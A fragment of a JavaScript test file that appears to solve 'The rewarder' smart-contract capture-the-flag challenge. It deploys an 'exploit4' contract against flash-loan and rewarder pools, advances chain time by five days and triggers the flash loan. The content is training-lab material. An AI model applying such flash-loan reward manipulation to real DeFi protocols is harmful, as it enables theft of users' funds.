...
describe('[Challenge] The rewarder', function () {
    ...
    let liquidityToken, flashLoanPool, rewarderPool, rewardToken, accountingToken,RewardExploit;
    ...
    it('Execution', async function () {
        ...
        const rewarder = await ethers.getContractFactory('exploit4', deployer);
        RewardExploit = await rewarder.deploy(flashLoanPool.address,rewarderPool.address,liquidityToken.address,accountingToken.address,player.address,rewardToken.address);
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
        await RewardExploit.executeflashloan();
